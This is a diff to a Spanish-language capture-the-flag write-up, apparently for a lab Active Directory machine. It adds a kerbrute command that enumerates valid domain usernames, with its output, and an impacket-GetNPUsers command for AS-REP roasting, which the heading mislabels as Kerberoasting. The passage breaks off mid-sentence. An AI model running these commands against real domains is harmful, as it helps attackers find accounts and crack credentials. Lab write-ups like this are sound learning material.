@@ -59,3 +59,24 @@ roleary
 smorgan
 ```
 
+Enumeración de usuarios validos con [[KERBRUTE]]
+`kerbrute userenum users -d MEGABANK.LOCAL --dc 10.10.10.172`
+
+```ad-hint
+[+] VALID USERNAME:       SABatchJobs@MEGABANK.LOCAL
+[+] VALID USERNAME:       mhope@MEGABANK.LOCAL
+[+] VALID USERNAME:       smorgan@MEGABANK.LOCAL
+[+] VALID USERNAME:       roleary@MEGABANK.LOCAL
+[+] VALID USERNAME:       svc-bexec@MEGABANK.LOCAL
+[+] VALID USERNAME:       svc-netapp@MEGABANK.LOCAL
+[+] VALID USERNAME:       AAD_987d7f2f57d2@MEGABANK.LOCAL
+[+] VALID USERNAME:       svc-ata@MEGABANK.LOCAL
+[+] VALID USERNAME:       dgalanos@MEGABANK.LOCAL
+```
+
+
+
+### Validar si son KERBERROASTEABLE
+`impacket-GetNPUsers -usersfile users -no-pass megabank.local/`
+
+Ninguno es 
